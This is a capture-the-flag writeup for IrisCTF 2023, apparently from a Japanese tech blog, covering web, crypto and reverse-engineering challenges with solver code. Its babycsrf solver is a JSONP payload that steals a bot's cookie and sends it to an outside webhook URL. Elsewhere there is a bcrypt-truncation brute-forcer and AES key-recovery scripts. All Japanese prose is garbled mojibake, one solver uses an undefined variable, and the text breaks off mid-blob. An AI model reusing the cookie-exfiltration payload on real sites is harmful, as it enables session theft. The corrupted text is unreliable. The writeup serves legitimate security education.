---
title: "IrisCTF 2023 - Writeup"
emoji: "ð"
type: "tech" # tech: æè¡è¨äº / idea: ã¢ã¤ãã¢
topics: ["CTF"]
published: true
---

1æ7æ¥ãã1æ9æ¥ã«ããã¦éå¬ããã IrisCTF 2023 ã«ã½ã­ã§åå ãï¼730ãã¼ã ä¸­23ä½ã§ããã

![](/images/iris-ctf-2023-writeup/2023-01-09-18-41-52.png)

# Web
## babystrechy (104 solves)
![](/images/iris-ctf-2023-writeup/2023-01-14-18-48-18.png)
ä»¥ä¸ã®PHPã³ã¼ãããµã¼ãä¸ã§åä½ãã¦ãã¾ãã
```php
<?php
$password = exec("openssl rand -hex 64");

$stretched_password = "";
for ($a = 0; $a < strlen($password); $a++) {
    for ($b = 0; $b < 64; $b++)
        $stretched_password .= $password[$a];
}

echo "Fear my 4096 byte password!\n> ";

$h = password_hash($stretched_password, PASSWORD_DEFAULT);

while (FALSE !== ($line = fgets(STDIN))) {
    if (password_verify(trim($line), $h)) die(file_get_contents("flag"));
    echo "> ";
}
die("No!");
```

`[0-9a-f]` ã§æ§æããã64æå­ã®ã©ã³ãã æå­å `$password` ãçæãã¦ãã¾ãã
ããã¦ã`$password` ã®åæå­ã64æå­ã«æ¡å¼µãã4096æå­ã® `$stretched_password` ã¨å¥åå¤ã®ããã·ã¥å¤ãç­ãããã°ãã©ã°ãåå¾ã§ãã¾ãã

ããã§ã`password_hash` é¢æ°ã«ã¤ãã¦èª¿ã¹ãã¨ä»¥ä¸ã®è¨è¿°ãããã¾ãã
> è­¦å
> PASSWORD_BCRYPT ãã¢ã«ã´ãªãºã ã«æå®ããã¨ã password ãæå¤§ 72 ãã¤ãã¾ã§ã«åãè©°ãããã¾ãã

https://www.php.net/manual/ja/function.password-hash.php

`PASSWORD_DEFAULT` ãæå®ãã¦ããå ´å `PASSWORD_BCRYPT` ã¢ã«ã´ãªãºã ãä½¿ç¨ãããããããã®åé¡ã§ã¯ `$stretched_password` ã®åé ­72æå­ããããã·ã¥åã«ä½¿ç¨ããã¦ãã¾ããã
åé ­72æå­ã¯ `$password[0]*64 + $password[1]*8` ã§åæå­ã¯ `[0-9a-f]` ã§ãããçµåããã¯256éããªã®ã§å¨æ¢ç´¢ãããã¨ãå¯è½ã§ãã

Solver ã¯ä»¥ä¸ã®éãã§ãã
```python
from pwn import *
import string
from itertools import product

context.log_level = 'debug'

for password in product(string.hexdigits[:16], repeat=2):
    password = "".join(password[0]*64 + password[1]*8)
    print(r.recvuntil("> "))
    r.sendline(password.encode())

r.interactive()
```

`flag: irisctf{truncation_silent_and_deadly}`

## babycsrf (56 solves)
![](/images/iris-ctf-2023-writeup/2023-01-14-18-58-38.png)

ä»¥ä¸ã®Flaskãµã¼ããåä½ãã¦ãã¾ãã
```python
from flask import Flask, request

app = Flask(__name__)

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/")
def home():
    return HOME_PAGE

@app.route("/api")
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"

app.run(port=12345)
```

```html:home.html
<!DOCTYPE html>
<html>
    <body>
        <h4>Welcome to my home page!</h4>
        Message of the day: <span id="message">(loading...)</span>
        <script>
window.setMessage = (m) => {
    document.getElementById("message").innerText = m;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>
```

`/api` ããJavaScriptã³ã¼ããåå¾ããäºåã«å®ç¾©ããã `setMessage` é¢æ°ãå®è¡ãã¦ãã¾ãã`setMessage` é¢æ°ã®å¼æ°ã«ã¯ã¦ã¼ã¶ã®cookieãä¸ãããã¾ãã
(ããããJSONPã¨ããä»çµã¿ã§ãã)
https://www.tohoho-web.com/ex/jsonp.html

ãã©ã°ã cookie ã«è¨­å®ãã¦ãã bot ãããããã® bot ã«ä»»æã®URLã¸ã¢ã¯ã»ã¹ããããã¨ãã§ãã¾ãã

`home.html` ã® `setMessage` ãå¼æ°ã®å¤ãå¤é¨ã¸éä¿¡ããããã«æ¹é ãããã®ãå¬éãã¾ãã(ngrok ãä½¿ãã¨ç°¡åã«å¬éã§ãã¾ã)
ããã¦ããã®å¬éURLã« bot ãã¢ã¯ã»ã¹ããã¾ãããã³ãã«æ¸ãã¦ããããã«ãcookie ã« `SameSite=None` ãè¨­å®ããã¦ãã¾ãããã®è¨­å®ã«ããã¯ã­ã¹ãµã¤ãã§ã cookie ãä»ä¸ããããããbot ã® cookie ã `/api` ã®ã¬ã¹ãã³ã¹ã«å«ã¾ããå¤é¨ã¸éä¿¡ãããã¨ãã§ãã¾ãã

Solver ã¯ä»¥ä¸ã®éãã§ãã
```html
<!DOCTYPE html>
<html>
    <body>
        <script>
window.setMessage = (m) => {
    location.href="https://webhook.site/...?flag="+m;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "https://babycsrf-web.chal.irisc.tf/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>
```

`flag: irisctf{jsonp_is_never_the_answer}`

# Crypto

## babynotrsa (145 solves)
![](/images/iris-ctf-2023-writeup/2023-01-09-19-13-33.png)

```python
from Crypto.Util.number import getStrongPrime

# We get 2 1024-bit primes
p = getStrongPrime(1024)
q = getStrongPrime(1024)

# We calculate the modulus
n = p*q

# We generate our encryption key
import secrets
e = secrets.randbelow(n)

# We take our input
flag = b"irisctf{REDACTED_REDACTED_REDACTED}"
assert len(flag) == 35
# and convert it to a number
flag = int.from_bytes(flag, byteorder='big')

# We encrypt our input
encrypted = (flag * e) % n

print(f"n: {n}")
print(f"e: {e}")
print(f"flag: {encrypted}")
```
```text
n: 21429933885346644587620272790089165813353259223649897308397918491861562279767580488441831451651834802520437234248670652477414296159324726172158330221397420877323921934377321483041598028053870169281419856238830264612049920637819183013812186448416408328958360799645342598727238977986741643705720539702955864527935398839069236768630867447760912744208154645904678859979378604386855741350220991958191408182147658532111413386776058224418484895056146180001830405844881486308594953615999140110712045286000170660686758188247928230655746746482354748673482506070246808187808961599576834080344066055446605664648340486804023919467
e: 10788856448030235429585145974385410619185237539198378911887172763282204686697141640582780419040340318300048024100764883750608733331571719088729202796193207904701854848679412033514037149161609202467086017862616635522167577463675349103892366486246290794304652162107619408011548841664240624935414339021041162505899467159623692906986841033101688573177710503499081107294555688550493634416552587963816327790111808356639558596438537569271043190414208204773219496030644456745185896540608008662177117212000718802474957268532153146989410300300554162811564064457762004188326986236869603714437275058878379647196886872404148116134
flag: 3954523654845598592730156937269688140867480061118457307435945875579028695730063528424973907208923014508950419982702682082417623843946231057553311028711409093751376287876799688357176816093484535703797332422565021382453879908968161161537921292725907853309522100738603080298951279637316809695591295752657105226749125868510570125512146397480808774515489938198191435285342823923715673372695893409325086032930406554421670815433958591841773705563688270739343539481283865883427560667086249616210745997056621098406247201301461721906304555526293017773805845093545204570993288514598261070097976786800172141678030841959348372097
```

$m = flag * e \mod n$ ãè¨ç®ãã¦ããã ãã§ãã$\mod n$ ã«ããã $e$ ã®éåãè¨ç®ãã$m$ã«æããã° $flag$ ãåå¾ã§ãã¾ãã

```python
from Crypto.Util.number import long_to_bytes

n = 21429933885346644587620272790089165813353259223649897308397918491861562279767580488441831451651834802520437234248670652477414296159324726172158330221397420877323921934377321483041598028053870169281419856238830264612049920637819183013812186448416408328958360799645342598727238977986741643705720539702955864527935398839069236768630867447760912744208154645904678859979378604386855741350220991958191408182147658532111413386776058224418484895056146180001830405844881486308594953615999140110712045286000170660686758188247928230655746746482354748673482506070246808187808961599576834080344066055446605664648340486804023919467
e = 10788856448030235429585145974385410619185237539198378911887172763282204686697141640582780419040340318300048024100764883750608733331571719088729202796193207904701854848679412033514037149161609202467086017862616635522167577463675349103892366486246290794304652162107619408011548841664240624935414339021041162505899467159623692906986841033101688573177710503499081107294555688550493634416552587963816327790111808356639558596438537569271043190414208204773219496030644456745185896540608008662177117212000718802474957268532153146989410300300554162811564064457762004188326986236869603714437275058878379647196886872404148116134
encrypted = 3954523654845598592730156937269688140867480061118457307435945875579028695730063528424973907208923014508950419982702682082417623843946231057553311028711409093751376287876799688357176816093484535703797332422565021382453879908968161161537921292725907853309522100738603080298951279637316809695591295752657105226749125868510570125512146397480808774515489938198191435285342823923715673372695893409325086032930406554421670815433958591841773705563688270739343539481283865883427560667086249616210745997056621098406247201301461721906304555526293017773805845093545204570993288514598261070097976786800172141678030841959348372097

e_inv = pow(e, -1, n)
flag = encrypted * e_inv % n
print(long_to_bytes(flag))
```

`flag: irisctf{discrete_divide_isn't_hard}`

## babymixup (98 solves)
![](/images/iris-ctf-2023-writeup/2023-01-14-12-24-45.png)
```python
from Crypto.Cipher import AES
import os

key = os.urandom(16)

flag = b"flag{REDACTED}"
assert len(flag) % 16 == 0

iv = os.urandom(16)
cipher = AES.new(iv,  AES.MODE_CBC, key)
print("IV1 =", iv.hex())
print("CT1 =", cipher.encrypt(b"Hello, this is a public message. This message contains no flags.").hex())

iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv )
print("IV2 =", iv.hex())
print("CT2 =", cipher.encrypt(flag).hex())
```
```txt
IV1 = 4ee04f8303c0146d82e0bbe376f44e10
CT1 = de49b7bb8e3c5e9ed51905b6de326b39b102c7a6f0e09e92fe398c75d032b41189b11f873c6cd8cdb65a276f2e48761f6372df0a109fd29842a999f4cc4be164
IV2 = 1fe31329e7c15feadbf0e43a0ee2f163
CT2 = f6816a603cefb0a0fd8a23a804b921bf489116fcc11d650c6ffb3fc0aae9393409c8f4f24c3d4b72ccea787e84de7dd0
```

`M1 = "Hello, this is a public message. This message contains no flags."` ã¨ `M2 = flag` ãããããAES(CBCã¢ã¼ã)ã§æå·åãã`CT1`,`CT2`ãä¸ãããã¦ãã¾ãã
ã¾ããããããã®æå·åã§ä½¿ç¨ãã¦ãããã©ã¡ã¼ã¿ `IV1` ã¨ `IV2` ãä¸ãããã¦ãã¾ãããã©ã¡ã¼ã¿ `key` ã¯ä½¿ãã¾ããã¦ãã¾ãã

1åç®ã®æå·åãããè¦ãã¨ã`IV1` ãAESã®ã­ã¼ã`key` ãAESã®IVã¨ãã¦ä½¿ç¨ãã¦ãã¾ãã1ãã­ãã¯ç®ã«æ³¨ç®ããã¨æå·åå¦çãå¾©å·å¦çã¯ä»¥ä¸ã«ãªãã¾ãã
- æå·å: $E_{IV_1}(M_1[0:16] \oplus key) = CT_1[0:16]$
- å¾©å·: $D_{IV_1}(CT_1[0:16]) \oplus key = M_1[0:16]$

ããã§ã$key$ ã®ä»£ããã« $M_1[0:16]$ ã AES ã® IV ã¨ãã¦è¨­å®ãã¾ããããã¨ãå¾©å·å¦çã $D_{IV_1}(CT_1[0:16]) \oplus M_1[0:16] = key$ ã¨ãªãã `key` ãæ±ãããã¨ãåºæ¥ã¾ãã
`flag` ã®æå·åã«ä½¿ç¨ããAESã®ãã©ã¡ã¼ã¿ãå¨ã¦åãã£ãã®ã§ãå¾©å·å¦çããããã¨ãã§ãã¾ãã

Solver ã¯ä»¥ä¸ã®éãã§ãã
```python
from Crypto.Cipher import AES

IV1 = bytes.fromhex("4ee04f8303c0146d82e0bbe376f44e10")
CT1 = bytes.fromhex("de49b7bb8e3c5e9ed51905b6de326b39b102c7a6f0e09e92fe398c75d032b41189b11f873c6cd8cdb65a276f2e48761f6372df0a109fd29842a999f4cc4be164")
IV2 = bytes.fromhex("1fe31329e7c15feadbf0e43a0ee2f163")
CT2 = bytes.fromhex("f6816a603cefb0a0fd8a23a804b921bf489116fcc11d650c6ffb3fc0aae9393409c8f4f24c3d4b72ccea787e84de7dd0")

message = b"Hello, this is a public message. This message contains no flags."
cipher = AES.new(IV1, AES.MODE_CBC, message[:16])
key = cipher.decrypt(CT1[:16])

cipher = AES.new(IV1, AES.MODE_CBC, key)
assert cipher.encrypt(message) == CT1

cipher = AES.new(key, AES.MODE_CBC, IV2)
flag = cipher.decrypt(CT2)
print(flag)
```

`flag: irisctf{the_iv_aint_secret_either_way_using_cbc}`

## Nonces and Keys (53 solves)
![](/images/iris-ctf-2023-writeup/2023-01-14-12-27-41.png)

sqlite3 ã®ãã¼ã¿ãã¼ã¹ãã¡ã¤ã«ã AES-128-OFB ã§æå·åãã¦ãã¾ããã¾ããæå·åã«ä½¿ç¨ãã key ã¯ `K = 0x13371337133713371337133713371337` ã§ãããã¨ãåé¡æããåããã¾ãã

AES OFBã¢ã¼ãã®å¦çã¯ä»¥ä¸ã®ãããªå¼ã§è¡¨ããã¾ãããªãã$P$ ã¯åã®ã¡ãã»ã¼ã¸ã$C$ ã¯æå·åå¾ã®ã¡ãã»ã¼ã¸ã§ãã
- æå·å: $C_j = P_j \oplus O_j$
- å¾©å·: $P_j = C_j \oplus O_j$
- å¡ä¾
    - $O_j = E_K(I_j)$
    - $I_j = O_{j-1}$
    - $I_0 = IV$

![](/images/iris-ctf-2023-writeup/2023-01-14-13-18-14.png)

1ãã­ãã¯ç®ã¨2ãã­ãã¯ç®ã«éå®ããã¨ãå¾©å·å¦çã®å·ä½çãªæµãã¯ä»¥ä¸ã«ãªãã¾ãã
- 1ãã­ãã¯ç®
    - $O_1 = E_K(IV)$
    - $P_1 = C_1 \oplus O_1$
- 2ãã­ãã¯ç®
    - $I_2 = O_1$
    - $O_2 = E_K(I_2)$
    - $P_2 = C_2 \oplus O_2$

ä»ãK ã¯æ¢ç¥ãªã®ã§ IV ãåããã°å¾©å·ãããã¨ãã§ãã¾ãã
ãã ããOFBã¢ã¼ãã§ã¯ãã­ãã¯ã®å¾©å·å¦çããªããããIVãç´æ¥æ±ãããã¨ãåºæ¥ã¾ãããããã§ã2ãã­ãã¯ç®ã®å¥å $I_2$ ãæ±ãããã¨ãã§ããªããèãã¦ã¿ã¾ãã

$P_1 = C_1 \oplus O_1$ ã¨ $I_2 = O_1$ ã®2å¼ããã $I_2 = P_1 \oplus C_1$ ãæãç«ã¡ã¾ããããªãã¡ãåã®ã¡ãã»ã¼ã¸ã¨æå·æã®1ãã­ãã¯ç®ã®xorãåããã¨ã§ã$I_2$ ãæ±ãããã¨ãåºæ¥ã¾ãã
ä»åã¯åã®ãã¡ã¤ã«ã sqlite3 DB ã§ãããsqlite3 DB ã®åé ­ 16byte ã¯ `SQLite format 3\x00` ã¨æ±ºã¾ã£ã¦ãã¾ãããã®ããã$I_2$ ãæ±ãããã¨ãåºæ¥ã¾ãã
https://www.sqlite.org/fileformat.html

1ãã­ãã¯ç®ãç¡è¦ããã¨ã$I_2$ ãIVã$K$ãã­ã¼ã¨ããAES(OFBã¢ã¼ã)ã§ $P[16:]$ ãæå·åãã¦ããã¨è¦ãªããã¨ãåºæ¥ã¾ãã
ããªãã¡ãåãAESã§ $C[16:]$ ãå¾©å·ããã¨ $P[16:]$ ãåå¾ãããã¨ãåºæ¥ã¾ãã

Solver ã¯ä»¥ä¸ã®éãã§ãã
```python
from Crypto.Cipher import AES

def xor(a, b):
    return bytes(aa ^ bb for aa, bb in zip(a, b))

with open("challenge_enc.sqlite3", "rb") as f:
    enc_db = f.read()

sqlite_signature = b'SQLite format 3\x00'

key = bytes.fromhex("13371337133713371337133713371337")
iv = xor(enc_db[:16], sqlite_signature)
cipher = AES.new(key, AES.MODE_OFB, iv)

db = sqlite_signature + cipher.decrypt(enc_db[16:])

with open("challenge.sqlite3", "wb") as f:
    f.write(db)
```

çæããã `challenge.sqlite3` ã®ä¸­ã«ãã©ã°ãå«ã¾ãã¦ãã¾ãã
```shell
$ strings challenge.sqlite3 | grep iris
Michaelmichael@irisc.tfirisctf{g0tt4_l0v3_s7re4mciph3rs}13371337
```

`flag: irisctf{g0tt4_l0v3_s7re4mciph3rs}`

# Rev

## Scoreboard Website Easter Egg (14 solves)
![](/images/iris-ctf-2023-writeup/2023-01-14-14-40-29.png)
ã³ã³ãã¹ãã®ãµã¤ãã«é ãæ©è½ãããããã§ããããã­ãããã¼ã«ã§ã³ã¼ããç¢ºèªãã¦ã¿ãã¨ã `theme.min.js` ã¨ããé£èª­åãæ½ããã JavaScript ã³ã¼ããããã¾ããéå¸¸ã®ã¦ã§ããµã¤ãã§ã¯è¦ãããªãæå·å¦çãå«ã¾ãã¦ããã®ã§ããããåé¡ã®ãã¡ã¤ã«ã ã¨èãã¦ããã§ãããã

![](/images/iris-ctf-2023-writeup/2023-01-14-13-45-45.png)

é£èª­åå¦çãè§£é¤ãã¾ããéç¨ã¯çç¥ãã¾ãããä»¥ä¸ã®ç¹ãæããã¨ã¹ã ã¼ãºã«è§£é¤ã§ãããã¨ãå¤ãã§ãã
- ããã­ãããã¼ã«ã§ãããã°ãã
- formatter ãä½¿ã
- IDEã®ã·ã³ãã«åå¤æ´æ©è½ãä½¿ã(åç´ãªæå­åç½®æã ã¨ãã¹ãããã¨ãå¤ã)

é£èª­åãè§£é¤ããã³ã¼ããä»¥ä¸ã§ãã
```javascript
document.addEventListener("DOMContentLoaded", (e) => {
  (() => {
    var d, b, h;
    const enc_image =
      "MdYEF1QlPRlKDvZcgLQVCN0ynA5bHmFDU/y+xxRsLYMvcrt9ow4RpL7Z9DXwn7NfhwvS+uON48+/44plBpeejnRC2QWzgHtoOTBJri9UNsLA7ZqpDybcSOGsDX1Q66ksAhS8W+vJvEEWGJRgk4QUR355LY64qBL+yv+TegRwskYL2gWala8Rsyi9oaPpftAF0lLxMLKHGQKvaStcZHNOsHtm2xvwCVGSLNZj7PX1woiMraRGaH/KuLLeUp9NdrJPDWJTsA+DGjAPe7kZhEn/8Ze2N3kQm8kOeHbqY8tRi/bWOrf6EmLCk3Epc84gJlm7iEoi9msihbyJJ5VT0DrZTMjb394by1G1NmTsQ8ZB+9wdp62KPYrRbK6HT2l5740DtJWMULgyOnk6habupiEdS2gJ/vxo3+kHd1K2e7ACox3V3S2MhC2MvlUTWYjZFnPYuK560txo1vUB0vguGsjGFBc/VJDVGWXUnlu/OTfFC4gzywQ4iJ66IYSojTIzfLxvLoth01S98qRVDe3BwwLOgQWy5tpx9GGARevvFsrx0NatCXvlmGg2GjBx8xl+44g+OFdqgu4eARMW5XMcFSMPBqL7HPlE5SFvi3o/CKd8eywTXJFeNC2yJYVQEAQEa3MQqQz0AIqGm5cKa1X4shtjOyfF1dr3Hv8WTw5hkLEGSERO3AlcJ6JZyyrjAV4Z7Mgw5cUOQ4mDvUQgsOz4+ITsl7RDg4topuK2+E5qlrblX3K6y2yFpBeF0/6Z6thRCXWVobcv4e41xbdOgeLGWRUDrg2aulg1gz4qokHAsUbY6YT3QctBWlGVbQ3SNj8zTXgk5RKXh+4KHWQpA4L4wfnzDs/rRoJIH0cZsfDovEdbpLI8BNOZ6MvlmtICwCg0+4yyG8SKyPomateKgKXCKOJmVa54PRErPdPNZxpXApJJ3g3WlABRfmAOYVDDnTTnmR7g7rTkSz7KtG14wAF6PVy3gntJKq7ZBckESajibE/FYMUTa70GCL8/8zVl8tLuZPvUXDSBEHgBsZgmi3DoN0UCd2hpVxyG7aosgw5ecGMP2Z0Aw44CYFbsCSgZ2/LYr+8Fg/rKNeQ5iInLc0hdlaWQS4Dox1VzTUxG334MJBQGdYEmCA/fSWMuGcMPYy4pLjY3pCQahM9V5oZz90umKKAlXHK+TxDuIOpwhx18vKGy4i+hSPXfP3Zo26eJUr4tL9/Hzs9m7s5psqlKFnDW1PXQJBf1DgY3L10CMkHwIgLS0a82ZFmqi9DRWRt6SlZMdtZazh8xmPqZtPr3IZ0I9R40HIMRCJ+VKBR2WBLdYLW+Ksx0hdU2pn6QzcJCRG8Ltx/LNr146mJPBYYyciHQCqU74wZTlCpjbTB9SqYOmHRjnySSjcVaO4FJZjwHpHGD/r5m2QNvWlY2+m6NTpzjEx5sAXxL9387p67wq/PfOAFpmYioJjDgOGlNTlU3cu4qvYwaAGwBf1wGUIm+rWXA+Yhci+wpCWrY5tnjbVt3CFnKUcNaQb+qFpsUPuUPZ7SaXZEEjC/Bac2braXqmTh0Xs1JcExLZtXlo5sBYtgsttfYYbWhWIE6bAABiY6CE9AnDOC165N8XzcOfLXXG+pmNUtvTkNI8xUDV2DniVncybEk6RdoI1fJp9QluyiAJsTK9KXCh/CS4XOfyeTK/50wOrrGITvzSSQEoRoDyN1QCQXWKYsG1T83xFdMDKFA8gLotK9yJGYHcjv8v1I5sXElZFmYG8/q9IaS0gn+gtnNjp9zorvn2zujUa06C4IzoLnWcA/LbZmlLZHP7BlRQjuoHNjLiAMkZ8fwyWg61jyy/7wB2y0YBBHuViywu9q+jJIU/S09vXV7ZlfNX/Al+h5JOLfcUbMxa0gorB1ijvqjsPEO28Z3V5Pf4ka2VZkbkbZ//HlYk1p5pWMuPh5YQ4gyDDSye2tafirf1ginzu15QBtJtchcTsg4GiPRG3U6dKAoK4FPAG6+ivdG91N/+XKYGeklwI3jNCZKXXRMDyGVPoWhFLukTDbfSw9uqjZKULioDDTqp+stw8+KiCa32bfQm8htf8YCXhsubB0ginboqtQFffHXbQ54XOosYVXFQqAMt22x0pZsrKDDddxdLUCx/ahj+bUoz9rkSYSFV51uPtTu0qkF+8X6hKjScJkyNAFinWGYWBcqi3AB0gCfJvHWZDbFg44Fq0fX1LWtC3Xsm1HI4hlAFo883pmbxWv6BBfCqShx4ijaBzCyWL43a+q5jhY+SMxkTS7CgWHTXg415oZ6X6HmaXLSPMEUShuHPKnpCBCqr9NmWlCLJFr171x+C+vu8Ta2bI6xNRW7xn1LsYaNxXRy4O71Gec64L9TMnG3RBZMTeH9NbipaMft53ly0T42W7mNkZd6rjorh79OKCtLAiSybscOHYr3v78+7/iPshIB1py5tX5ddcvSqpGi6Og/H2g7SR98/BA4jWn5DVY8GUmxLp3Y60jkW09Xww38nYjStp22fQxEfSvU6Pp7XizQBAAN4Uv/Zv7yFka1xxF9kd9aQFY+R7R4NrNYYSUF4cKIYCYWKQpUKGLk1Lm0z7OjRgRmAwhhv9VuD0Q1LziDC4b5nF2c5lMDoJ2LILsLGFfYUZ7XTKzhaOfGwWQS3miSMt0dq4Cn7qkgcKyli2bgFp6kH7igcmsfgCN704WuRaoVVz8ediMDDEHzAQ6zTv9yqPr+px0E97uD0KAJ8cxNPpn4b1hPecr5b9IWDHK6phMjbAH0vBPUiGzunIn99uHGeIGhn2nHzADuct5dQSU2lD+UeDWTbXeSjHW3qPUbeuJ7gPIbX9gW8umYV9lixV2e5B92DQ+E2XWQALlkZQRXqvls3eMfCoWII7R+9hYi/8koQy3zq7WmT1c4flD/BOnHfUA7BvN8XSaRTiw1dnvvRZOQfVUEwsgd4Pa57u3LMOvmYHb5x3IQEO2S+g4AKhsF/LH6cHfcMH5rZbsqzOBLRF7ge6NtPDDEOsl94M9fpRdwSrZ047RvFQPMdpVSJSTGtIZzWQS+9sOtjboOdT0o+hxJVp/m+Iu2kMholR2cuIp75q5l6gNUZf+qgiercPEOFhL/9H/GSyHuuAWf+gX68JTo30WN3ZPvUQp0Q+65ZEF+26A2WUMqgxgZT5Pd28PM+sJO+x7Bi8veDQ7gLqEbxMVzOrDoEo3Y/HoZLyrVKyVO8iiZ8ikdMcBnvxClq7oU0aKtaeD+kcI7J8Vq/0UlOmoVmTpDX/3497KHA6ByaMsPvqtoMwGWcrMfg+5wh+pTrlj0LGsOq2EdfN+yFJ1GFbG7kMVX5y724pnCR5EXg+wwd0+Np3+nVhsoekRedm3L9rvWNGWC2pMh87TxW8lzIbsavQFde1qeJFmaBiv1Dv9cXcqy97UGR/UZhOZ3HU4US6OATFx71RicYTTPXSL6dHf4CFajf8HlJA4gsWAFslD7Vyug2h7Tkwzs5RXjXhAkWlQWoOiTBFDE3BcgGuFt1pcP+2gcO8BUKmw6Xb3lIeFMAcHDHFDWC/PMstb/0i9cDvVQrWda/nnIMpWmLV3O86cG1GNs7DGC+IVUcpoyS7rFcGyvQxl5NQJBGHnxokoAG3VEJXse5p0qXi8L9AkLRgrTm5dg357rNu8PVX39S+1yEC/7Y8g83kBOQeTKLczMX3YignMzVNmRGCMyh9UQ9Ilb8wDW3lVq3o2xZa0aqfaL/4toDneoq/YC+k8EA3YAdEMiueYakjIP0BAlGCD2VzyW/kHy6zGcZc0LgM3pb7GgS486LnVAq3/sIWuppVpVnvX7yqUgsOi0IQohxiifX0ff9YuhWVJYcVZw2+vou5pA5UGQ73qYWjf1GWBhs+cxL6clCWxyTWQzKmfV5voYtdJivLrEpIni0k8CyUwdvENy8KgSJcq6zdgk3d28sJnRPYfEVFhHmT47WDzRZ1ilmxE3jUvf6qE32n7pUCBbG9hqTKmmf2tDiu0QYrOB0Cu30fxYSo1hF1DaMsasTiQ+YmDBjLzRTBGC9HuT0X3ILm/QPPRq3kvejz5UsiwSU7RAzZfZPRz5j6otfaCVPD6ImVi0NwK/W9oikeoSQqJTMpUfBXsagp2a/qiwlgQ+E1L7GwpjTqIJIu03BfFuzjYL75D7M02NZG74l7sFXmRqZn2CO/bFh/is2ArUXqd3tkfYVPBFkN+gpklsFX2Uh6HpuWbz9Du4AvHwVrPiwn1PaltxVDXUINRRu55rjuBq5OK3OfbyQ1ruRr3iNiBDCQY5A9/CL+UoN9IJYlT2/luNHGBbs2Hqoy1Qf6C26VGeaZCc2SoCL6xTT0Bo3ZVyxVZkp2htpaD4mOC71dzABwN6Eb+lISvbfPy/r9QvdBhyvr42byOnUvnEH5PysVu6RGs5SVy2xeEUUaCv9Y4rn/fpPv++nQEkRWnRe9qqNniOEWQscp+JEW98UEg1MqOwkUJcJYnrtO+IQ7xBuCJgVGkVOLnFCuH5v0NeFBw1bUyHWSd9jgavrPisFcYqwN1Q5Al2GuUI4iQS1i3Y35u316v1CZvH2bjjdiRCe2lfG2VALbyOoPGBexwT2NKfIVFWMQFrZfJBHvDZIAbQ1MaHQrKT1BeOHZ03i3Pp0kutZmJlVbzjQgw1gEHMhqShwQ2ZV3OpZ7Y9KXThbpd6eVwyteoauZkSlqBlkCeAvjdoAphoAWSSKBBMKZfU7BmFCxrs6K+ewd2BwlGMxJRCDJy//UTssxs9jOgEnqzjeH3oc966WpFmA5K4nIe8U+5PWUftyZhUEO9opUxSx9pBO6SzPfgKhnTdPNCMiiXpjOO/pNQzu0qj5ck2jS0/QafIoIhBRbF0ugG+ph6Bv8MMIHnR4W5Z45vUtuTjBNtgPH9D0VkfTjHBBCcgyAnJR2vRdtzlAK7pKyw7Bi9fndm28tbPc0IVk8FmobXbMetX/tLfU0gfk7ApUjgqOu2p6imN+CuKxeWZm3aSOV+EPAvoJS2hOPVELPEVeIEmTehroQGbp0H/IdSfWfGpCYi0RnUqMOhcDDd3bGEP1UBD0rql8/S145MHSlF7fvhEc8m4zThT/3LKtOQDcD78o2tbsfLpAyXL1ie1BCuBsFNES+vLeo+yQllG1grETCiIZXwIpAiYRGZxYTbKdX5DiC0QPlt9VSEL8u/IkTTAM/QIts/Rx+p4eW0V3gnkjqLiJd9dvk8yyVdYsmh/qBACxVPdPxuEf9m+MXFghj7KabL7D7MSVg7yduwzewRu9EtKFJs/bUbTJDeXLHS66RoIkH03y7cKh83PHpB6FXym0ngh4xauqa0t+Q8QZzILO2RgRKzUF7ZkEUoB0UJwQcvT2oXwXrWGwiJUXkOEauIRjC5BcMEGhD/DgtKTbmYKtIGgdkY2tAMSUokamCMAmuOtmdU4Ad/Vm8hPs0/pRCY3HG55oxifKb0vC8i29zgTrh4FBeAgLNt/TikpH2k2g+6GvzXbA0nhaHE7q1/zjB1YxE2FTx6w4LDQZkYblMVFB987f9uz9JDBr1l9MUJRegSAUtv1HnQI/9edNice935DOvOVyr8NHHOdMEVGghSpxrNLUfogP0wtcq9XvyB99UPqbzvxAOOOr0pbfwmZDJQQVH9nUgTVyppD4r1QmfBL2X4ysHCMMrjCxg70A2EOFIYEZtECTRnAVkeP/RSjZSO+La3AEqJ970+VswRclpYtRpDi1F1mcPZ6MEnlMYeA7q2ob3smCWF3Y9TY9v6tElQJeGmSCVjhsvcQzErg7e9fQPbO45dKVv2YKYY2Z3s/OL74kLAthNeozMA2Nrxq0bo1yr6uvsljJjsbYv9WcMR81dDilcCiB/0QvJ22mENSWih12p9xw8cy6lNoHKkudubnDrCpUVTbqSAsKdDwbovbVQbI6e8SpqWvLcRTsA+PS8+rq1Z9lGo8mEFXjMTuDNS6bmvpiFkxOg+CQxmDLAdd6IQxYmGccdkpo8rw13bT5rGZT+xM85H/UUvPgpFoOwpJG5nJZ/fQXikcHpb36z9lclBIXDeWRypngbFMfpJ6dKGssR1tZsNdDfXUJQS4iTVHA7Hp4/2ah8TgUkC1GLu73w5frEa2FCjxsN0ufglQ9Z6E7u8Kb+1SiDOoecE/xjkbhYG3w1umgOxW71Ikmcc6mQtn96qyF8oWtIhyk5xE+jovSNbve/+SweKRpjDuMwo0pKTIx1vamndm3PNzqkWMsqnzMi7mFTAk3J/ddP+zytynkyFRFUwIunHFJn4Ljuxflks+nfAME6qjW+oAVkAVA9rKp3EvwiZ0JISNTSK7spgnncZ0I0fscEfQ8o8okdl7HWpdv0YiqLI30m5rAOmFHPrO4eNYuQDz40+F/3UfC6FZcZXQJUOf/zyDgJNMqqghRGnyab4vhCeBQ6CUacbizpjTt/HU/cehDXZ+hDj4MdCJ1PHWf9+qp6vradqcGjdGZTCtiJNrP8xyLITmWwht4IIR0vU5wXSKLGcKj8Dd337Fq3gSAGnU/nqm6VwBI2FIOVRNGS22pk22M96CIoOBa8Hqi1R7gUfExGFVr9+cP4+LMdj44ZTlLoSPl5E8FtO70cTSEUAjW0ppFJGmrCWKyrFrHxRRJ7e8c9S+TKo/tAOpRrkOtBqsgvzXfmPCKgQnifn5q/DBgg/wUZv9V+0GP3Zjkd/cm6rtraXhbE+u6uOHDw+pCXs9cVbgh+W2O1d9ktMwPxHd8pF/2CF+tx2XLz0bHZu0LOAS5MqoQ0K06lKep+xUoF9WF9BV7oSLsURy0ltHbUW+sw5